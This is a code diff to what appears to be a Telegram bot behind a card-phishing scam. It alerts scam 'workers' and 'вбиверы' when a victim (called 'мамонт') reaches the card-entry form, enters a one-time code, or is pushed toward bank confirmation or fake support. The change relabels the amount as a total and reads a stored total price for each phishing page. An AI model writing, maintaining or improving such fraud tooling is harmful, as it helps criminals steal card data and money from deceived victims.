@@ -293,7 +293,7 @@ def format_card_notification_message(page_code, name, price, currency, admin_use
         f"🔔 Мамонт перешел на ввод карты ({event_name})\n\n"
         f"🎫 {event_name}\n"
         f"👤 Мамонт: {name or 'Не указано'}\n"
-        f"💰 Сумма: {price or 'Не указано'}{currency or ''}\n"
+        f"💰 Общая сумма: {price or 'Не указано'}{currency or ''}\n"
         f"🧑‍🏭 Воркер: #{admin_username or 'Не указано'}"
     )
     
@@ -328,7 +328,7 @@ def format_code_notification_message(page_code, code, price, currency, admin_use
         f"🔔 Мамонт ввел код ({event_name})\n\n"
         f"🎫 {event_name}\n"
         f"🔐 Код: {code or 'Не указано'}\n"
-        f"💰 Сумма: {price or 'Не указано'}{currency or ''}\n"
+        f"💰 Общая сумма: {price or 'Не указано'}{currency or ''}\n"
         f"🧑‍🏭 Воркер: #{admin_username or 'Не указано'}"
     )
     
@@ -340,7 +340,7 @@ def format_push_notification_message(admin_username, name, price, currency):
         f"🔔 Отправлен на ввод пуш\n\n"
         f"🧑‍🏭 Вбивер: @{admin_username or 'Не указано'}\n"
         f"🐘 Мамонт: {name or 'Не указано'}\n"
-        f"💰 Сумма: {price or 'Не указано'}{currency or ''}"
+        f"💰 Общая сумма: {price or 'Не указано'}{currency or ''}"
     )
     return message
 
@@ -350,7 +350,7 @@ def format_support_notification_message(admin_username, name, price, currency):
         f"🔔 Отправлен обратиться в ТП\n\n"
         f"🧑‍🏭 Вбивер: @{admin_username or 'Не указано'}\n"
         f"🐘 Мамонт: {name or 'Не указано'}\n"
-        f"💰 Сумма: {price or 'Не указано'}{currency or ''}"
+        f"💰 Общая сумма: {price or 'Не указано'}{currency or ''}"
     )
     return message
 
@@ -360,7 +360,7 @@ def format_text_notification_message(admin_username, name, price, currency):
         f"🔔 Отправлен на кастомное окно\n\n"
         f"🧑‍🏭 Вбивер: @{admin_username or 'Не указано'}\n"
         f"🐘 Мамонт: {name or 'Не указано'}\n"
-        f"💰 Сумма: {price or 'Не указано'}{currency or ''}"
+        f"💰 Общая сумма: {price or 'Не указано'}{currency or ''}"
     )
     return message
 
@@ -415,7 +415,7 @@ def format_code_request_message(admin_username, name, price, currency, page_code
     
     # Сума - тільки якщо є
     if price and price != 'Не указано' and price != 'N/A':
-        message += f"💰 Сумма: {price}{currency or ''}\n"
+        message += f"💰 Общая сумма: {price}{currency or ''}\n"
     
     # Сторінка
     if page_code:
@@ -2315,6 +2315,16 @@ async def admin_enter_text(message: types.Message):
             if event_info:
                 event_price = event_info.get('price')
                 event_currency = event_info.get('currency')
+            
+            # --- Перевіряємо чи є збережена total сума для цього page_code ---
+            if page_code in payment_totals:
+                stored_total = payment_totals[page_code]
+                # Використовуємо збережену total суму замість базової ціни
+                event_price = stored_total['total']
+                event_currency = stored_total['currency']
+                print(f'[DEBUG] Using stored total amount for text notification: {event_price} {event_currency}')
+            else:
+                print(f'[DEBUG] No stored total amount for text notification, using base price: {event_price} {event_currency}')
             
             # Надсилаємо красиве повідомлення про текст адміну, чия це посилання
             admin_user_id = None
